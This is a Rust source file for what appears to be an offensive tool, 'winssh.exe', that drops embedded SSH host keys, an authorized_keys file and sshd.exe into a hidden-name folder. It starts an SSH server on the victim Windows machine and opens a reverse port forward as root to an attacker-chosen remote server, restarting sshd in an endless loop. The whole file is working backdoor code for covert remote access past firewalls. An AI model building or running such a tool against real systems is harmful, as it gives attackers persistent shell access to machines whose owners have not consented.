use std::fs;
use clap::{Parser};
use rand::{distributions::Alphanumeric, Rng};
use rust_embed::RustEmbed;
use std::path::{Path};
use std::process::{Command,Stdio};
use whoami;

#[derive(RustEmbed)]
#[folder = "files/"]
struct Asset;

#[derive(Parser)]
#[clap(name="winssh.exe", author="xct (@xct_de)", version="0.1", about="simple ssh server on windows", long_about = None)]
#[clap(propagate_version = true)]
struct Cli {
    #[clap(short, long)]
    port: u16,
    #[clap(short, long)]
    server: String
}

fn main() {
    let cli = Cli::parse();    
    let port = cli.port;
    let remote_server = cli.server;

    let rs: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(6)
        .map(char::from)
        .collect();  
    
    let tmp = format!("{}", rs);
    fs::create_dir(&tmp).unwrap();

    let username = whoami::username();
    let files = ["host_rsa.pub", "host_dsa.pub", "host_rsa", "host_dsa","authorized_keys","sshd.exe","sshd.pid","key-reverse"];
    for i in 0..files.len() {
        let f = Asset::get(files[i]).unwrap();
        let path = Path::new(&tmp).join(files[i]);
        fs::write(&path, f.data.as_ref()).unwrap();

        let pathstr = path.display();
        let cmd = format!("icacls {} /reset ; icacls {} /grant:r {}:f /inheritance:r >nul 2>&1", pathstr, pathstr, username);
        Command::new("cmd").arg("/c")
        .arg(cmd)
        .spawn()
        .unwrap();        
    }
    let tmp_abs = Path::new(&tmp).canonicalize().unwrap().display().to_string();
    let tmp_as = &tmp_abs[4..tmp_abs.len()]; // remove \\?\
    let config = format!("Port {}\n\
        ListenAddress 127.0.0.1\n\
        HostKey {}\\host_rsa\n\
        HostKey {}\\host_dsa\n\
        PubkeyAuthentication yes\n\
        AuthorizedKeysFile {}\\authorized_keys\n\
        # PasswordAuthentication yes\n\
        # PermitEmptyPasswords yes\n\
        GatewayPorts yes\n\
        PidFile {}\\sshd.pid\n\
        Subsystem	sftp	sftp-server.exe\n\
        Match Group administrators\n\
        \tAuthorizedKeysFile {}\\authorized_keys\n\
    ",port,tmp_as,tmp_as,tmp_as,tmp_as,tmp_as);

    let path = Path::new(&tmp).join("sshd_config");
    fs::write(&path, config).unwrap();
    // create the tunnel and remote port forward
    println!("Creating reverse port forward for port {}",port);
    let rev = format!("Push-Location {}; ssh -i {}\\key-reverse -R {}:127.0.0.1:{} root@{} ;",tmp_as, tmp_as, port,port,remote_server );
    Command::new("powershell").stdout(Stdio::null()).arg("-c").arg(&rev).spawn();

    // start server
    let cmd = format!("Push-Location {}; .\\sshd.exe -f {}\\sshd_config -E {}\\log.txt -d; Pop-Location", tmp_as, tmp_as, tmp_as );
    println!("Running SSH-Server on port {}", port);
    // every ssh connect would close the server, hence the loop
    loop {
        Command::new("powershell").arg("-c")
            .arg(&cmd)
            .status() 
            .unwrap();   
    }
}
